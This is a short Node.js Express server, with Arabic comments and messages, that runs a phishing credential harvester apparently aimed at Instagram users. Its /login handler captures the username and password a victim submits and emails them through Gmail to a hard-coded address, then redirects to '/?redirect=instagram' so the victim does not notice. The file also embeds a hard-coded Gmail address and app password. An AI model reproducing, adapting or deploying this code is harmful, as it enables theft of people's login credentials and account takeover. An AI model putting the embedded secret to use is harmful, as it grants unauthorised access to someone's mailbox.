const express = require('express');
const nodemailer = require('nodemailer');
const app = express();

app.use(express.static('public'));
app.use(express.urlencoded({ extended: true }));

// هذه هي الإضافة المهمة
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});

app.post('/login', (req, res) => {
  const { name, password } = req.body;

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'itinfor79@gmail.com',
      pass: 'eqlfoyyxgoknvjne'
    }
  });

  const mailOptions = {
    from: 'itinfor79@gmail.com',
    to: 'itinfor79@gmail.com',
    subject: '📩 تسجيل دخول جديد',
    text: `اسم المستخدم: ${name}\nكلمة المرور: ${password}`
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('❌ فشل الإرسال:', error);
      return res.send('حدث خطأ أثناء الإرسال.');
    }
    console.log('✅ تم إرسال البيانات:', info.response);
    res.redirect('/?redirect=instagram');
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Running on http://localhost:${PORT}`));
